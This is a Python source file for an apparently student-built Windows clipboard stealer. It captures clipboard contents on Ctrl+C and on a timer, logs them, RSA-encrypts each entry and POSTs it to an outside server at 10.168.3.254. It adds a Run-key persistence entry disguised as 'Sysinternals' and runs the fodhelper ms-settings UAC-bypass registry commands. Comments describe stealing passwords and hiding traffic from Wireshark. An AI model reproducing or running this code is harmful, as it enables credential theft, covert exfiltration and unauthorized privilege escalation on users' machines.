import os.path

import pyperclip
import requests
import schedule
import time

from fontTools.merge.util import first
import subprocess
from pynput import keyboard
import keyboard
import rsa
import  winreg
import pyuac
import win32security

#TODO: EDIT BEFORE REPOSTING
#invisible character idea is cool to fuck with clipboard!!!, makes it less obvious
#Check how it looks in wireshark!!! - make sure password is encrypted...
#check communication in vms
#set up two VMS, add to network group, make sure it works between the two...
#can do two openstack boxes, make sure to add them to same security group and set up the networking between them
#NEED A NAME FOR THE TOOL

public = rsa.PublicKey(
        22801902741575260508046760451684121524343309971392815027806038442328813626689876929878295531764425101721113803279088975380306285103839798562486473563504890609732689910231035352994358600476885112341914819232866689789408515621209722745373194438974054762656866686749518758325281935986106093899741071523184790288397250570095386108667233843051192504696785064008214814463197996158290147894449246014411585018720395948432620796871823751561082698116083062968467223326531809351871820333024478963454054743945987929181103396110463090638025544498539475681820761973201801628104421055632663943101423395201694333712187265928179307257,
        65537)

def main():
    current: str = os.path.abspath(__file__)
    #if not pyuac.isUserAdmin():
    # If not running as admin, set reg keys to execute the script with bypassing User Account Control (UAC)
    my_env = os.environ.copy()
    my_env['COMSPEC'] = r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'

    #cmd5 = ["reg", "add", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe", "/v", "Sysinternals", "/t","REG_SZ", "/d", current]
    #result = subprocess.run(cmd5, shell=True, capture_output=True, text=True, env = my_env)
    #print(result)

    #cmd = ["", "-Path", "HKCU:\\SOFTWARE\\Classes\\ms-settings\\shell\\open\\command", "-Force | Out-Null"]

    #cmd = ["New-Item", "-Path", "HKCU:\\SOFTWARE\\Classes\\ms-settings\\shell\\open\\command", "-Force | Out-Null"]
    #result = subprocess.run(cmd, shell=True, capture_output=True, text=True, env = my_env)
    #print(result)
    #using exe path...
    #cmd2 = ["Set-ItemProperty", "-Path", "HKCU:\\SOFTWARE\\Classes\\ms-settings\\shell\\open\\command", "-Name", "(Default)", "-Value","$MyInvocation.MyCommand.Path", "-Force" ]
    #result = subprocess.run(cmd2, shell=True, capture_output=True, text=True, env = my_env)
    #print(result)

    #cmd3 = ["New-ItemProperty", "-Path", "HKCU:\\SOFTWARE\\Classes\\ms-settings\\shell\\open\\command", "-Name","DelegateExecute", "-PropertyType","String", "-Force | Out-Null"]
    #result = subprocess.run(cmd3, shell=True, capture_output=True, text=True, env = my_env)
    #print(result)

    #cmd4 = ["Start-Process", "fodhelper.exe", "-WindowStyle", "Hidden"]
    #result = subprocess.run(cmd4, shell=True, capture_output=True, text=True, env = my_env)
    #print(result)

    #New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force | Out-Null
    #Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(Default)" -Value $value -Force
    #New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -PropertyType String -Force | Out-Null

    # Trigger the UAC prompt by running fodhelper
    #Start-Process "fodhelper.exe" -WindowStyle Hidden
    #exit()

    # UAC bypassed here!

    # Exit the script to allow the rest run as admin
    #problem is it pops up a service
    #if not pyuac.isUserAdmin():
        #cmd2 = ["Start - Process", "fodhelper.exe", "- WindowStyle", "Hidden"]
        #result2 = subprocess.run(cmd2, shell=True, capture_output=True, text=True)
        #print("Re-launching as admin!")
        #pyuac.runAsAdmin()
        #print(result2)
        # Already an admin here.

    location = winreg.HKEY_CURRENT_USER

    #r is needed for backspacing characters
    #path = winreg.OpenKeyEx(location, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", winreg.KEY_ALL_ACCESS)
    #this needs to be here
    #cmd = ["reg", "add", "HKLM\\Software\\MyCo2"]
    #reg add <key> [/v <value>] [/t <type>] [/d <data>]

    #"/v KeyTest", "/t REG_SZ", "/d 10"


    #TODO: PRIVILEGE ESCALATION OR THIS WON'T WORK
    #TODO: I have thi sin a run key that is created, need it to actually get the correct file path and run the script
    #TODO: research why script is not running how it should...
    #TODO: try HKCU
    #TOOD: add to startup folders...
    cmd5 = ["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "Sysinternals", "/t", "REG_SZ", "/d", current]
    #TODO: https://stackoverflow.com/questions/19672352/how-to-run-script-with-elevated-privilege-on-windows, use this to run as admin
    #reg add HKLM\Software\MyCo TODO: this works but only in admin mode so need to enable admin running!!!
    #os.system(cmd)
    #subprocess.run(cmd, shell=True)
    #typically runs in cmd.exe
    result = subprocess.run(cmd5, shell=True, capture_output=True, text=True, env = my_env)

    #result = subprocess.run(["dir"], shell=True, capture_output=True, text=True)
    print(result)
    #os system and regedit
    #first_key = winreg.CreateKey(path, "Discord")

    current = os.path.abspath(__file__)
    #winreg.SetValueEx(path, "Sysinternals", 0, winreg.REG_SZ, current)
    #TODO: COULD ADD THE PERSISTENCE MECHANISM...
    #

    #gets the clipboard information and puts it in a file every 90 seconds.
    schedule.every(90).seconds.do(get_clipboard_info)

    #Reestablishes the persistence mechanisms
    #schedule.every(45).seconds.do(reestablish)

    #Adds a hotkey, can't have parenthesis becasue it returns as a none type instead of a boolean
    #explore the timeout feature to add some more functionality
    # TODO: right click copy as well, and paste
    keyboard.add_hotkey('ctrl+c', get_clipboard_info)

    #ctrl V ensures that the clipboard data is changed to password
    keyboard.add_hotkey('ctrl+v', add_invisible_character_to_clipboard)

    #from https://schedule.readthedocs.io/en/stable/examples.html, schedule documentation
    #code handles the scheduled task
    while True:
        schedule.run_pending()
        time.sleep(1)

#global value that stores the last clipboardValue copied, starts as empty
last_clip_board_value = ''

"""
get_clipboard_info is triggered when Ctrl+C happens. The method checks if the clipboard data 
is different from the last clipboard data that was copied. If it is, then it adds it to the local 
clipboard data file, adds a timestamp to the password, and sends a post request to the server with 
the clipboard file atatched. 
"""
def get_clipboard_info():
    #have to define as a global because of how python scope works
    global last_clip_board_value
    global public

    #need a delay here so that the ctrl+c copy updates the clipboard before the information is grabbed
    #if we do not have this delay: at the end of this method the clipboard info is changed to password
    #so if there is no delay then the password sometimes remains as the clipboard info
    #it would then be saved as the clipboard info before copy updates. this delay makes sure that
    #the clipboard is updated with the copied info before it is assigned to any variables
    #short delay so that when ctrl+v is used it still copies password over and then pastes it
    time.sleep(0.25)

    # paste, pastes text from clipboard
    clipboard_info = pyperclip.paste()

    #TODO: make sure to create a filepath and put it somewhere...!!!!
    #TODO: add persistence!!!

    # a appends data to file so the passwords can be stored over time password
    filepath = os.path.join('C:/Tools/Sysint/MalTest/', 'info')
    if not os.path.exists('C:/Tools/Sysint/MalTest/'):
        #makes the directory if the path doesn't exist
        os.makedirs('C:/Tools/Sysint/MalTest/')
        filepath = os.path.join('C:/Tools/Sysint/MalTest/', 'info')

    clipboard_data_file = open(filepath, "a")

    #checks if the last clipboard value is equal to the current one
    if not last_clip_board_value == clipboard_info:
        #TODO: write it to a file, communicate line by line instead of sending the entire file each time

        #writes the clipboard value to the file along with a timestamp
        clipboard_data_file.write(clipboard_info + ' (' + time.asctime(time.localtime()) + ')')
        clipboard_data_file.write("\n")

        formatted_clipboard_info = (clipboard_info + ' (' + time.asctime(time.localtime()) + ')').encode('utf8')
        encoded_clipboard_info = rsa.encrypt(formatted_clipboard_info, public)

        #closes the file to avoid issues with already being at the end of the file when trying to exfil the contents
        #of the file
        clipboard_data_file.close()

        #reopens the file in read only mode
        #exfil_file = open("passwordLog.txt", "r")

        #Posts the file to the server (currently local host), and assigns the file under the key: file
        #requests.post("http://127.0.0.1:12345/output", files={'file': exfil_file})


        #encoded_clipboard_info = rsa.encrypt(formatted_clipboard_info, public)

        #TODO: THIS CAN BE SEEN IN WIRESHARK...

        requests.post("http://10.168.3.254:80/output", encoded_clipboard_info)

        #TODO: consider not storing a file of passwords
        #TODO: reroute to the correct server...

    #if the last and current clipboard value match then close the file
    else:
        clipboard_data_file.close()

    #Updates the last clipboard value
    last_clip_board_value = clipboard_info

    #changes the clipboard data to the same word but with an invisible character at the end
    add_invisible_character_to_clipboard()

"""
add_invisible_character_to_clipboard takes the current clipboard_value and adds an invisible character takes takes
to the end of it
"""
def add_invisible_character_to_clipboard() -> None:
    # https://unicode-explorer.com/c/115F
    invisible_character = 'ᅟ'

    # paste, pastes text from clipboard
    clipboard_info = pyperclip.paste()

    # copy - copies whatever text to the clipboard
    #in this case copies the current clipboard info plus an invisible character

    #could use endswith or in(java contains)
    #if there is already an invisible character then we don't need another
    if invisible_character in clipboard_info:
        pyperclip.copy(clipboard_info)
    else:
        pyperclip.copy(clipboard_info + invisible_character)

"""Reestablishes persistence mechanism once it gets deleted..."""
def reestablish() -> None:
    location = winreg.HKEY_CURRENT_USER
    path = winreg.OpenKeyEx(location, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", winreg.KEY_ALL_ACCESS)
    current = os.path.abspath(__file__)
    #need to set the value
    winreg.SetValueEx(path, "Sysinternals", 0, winreg.REG_SZ, current)
"""
change_password changes the clipboard data to password
"""
def change_password() -> None:
    # copy - copies whatever test to the clipboard
    #in this case copies the current clipboard info plus an invisible character
    pyperclip.copy('password')

def establish():

    #cmd = ["reg", "add", "HKCU:\\SOFTWARE\\Classes\\ms-settings\\shell\\open\\command",
    #        "/v", "Sysinternals", "/t","REG_SZ", "/d", "C:\\Windows\\System32\\fodhelper.exe"]

    #cmd2 = ["reg", "add", "HKCU:\\SOFTWARE\\Classes\\ms-settings\\shell\\open\\command",
    #        "/v", "DelegateExecute", "/t","REG_SZ", "/d", ""]
    #cmd3 = ["reg", "add", "HKCU:\\SOFTWARE\\Classes\\ms-settings\\shell\\open\\command",
    #        "/v", "(default)", "/t","REG_SZ", "/d", "C:\\Windows\\System32\\clipboard_copy_test.exe"]

    cmd = ["powershell", "-Command", "New-Item", "-Path", "HKCU:\\SOFTWARE\\Classes\\ms-settings\\shell\\open\\command", "-Force"]

    cmd2 = ["powershell", "-Command", "New-ItemProperty", "-Path", "HKCU:\\SOFTWARE\\Classes\\ms-settings\\shell\\open\\command", "-Name",
            "DelegateExecute", "-Value", "?", "-Force"]

    cmd3 = ["powershell", "-Command", "Set-Item", "-Path", "HKCU:\\SOFTWARE\\Classes\\ms-settings\\shell\\open\\command",
            "-Value", "C:\\Windows\\System32\\clipboard_copy_test.exe", "-Force"]


    #result1 = subprocess.run(cmd, shell=True, capture_output=True, text=True, env = my_env)
    result1 = subprocess.run(cmd, capture_output=True)
    result2 = subprocess.run(cmd2, capture_output=True)
    result3 = subprocess.run(cmd3, capture_output=True)

    #result3 = subprocess.run(cmd3, shell=True, capture_output=True, text=True, env=my_env)

    print(result1)
    print(result2)
    print(result3)

    #cmd4 = ["Start-Process", "fodhelper.exe", "-WindowStyle", "Hidden"]
    #result = subprocess.run(cmd4, shell=True, capture_output=True, text=True, env = my_env)
    #print(result)

establish()
#calls main
main()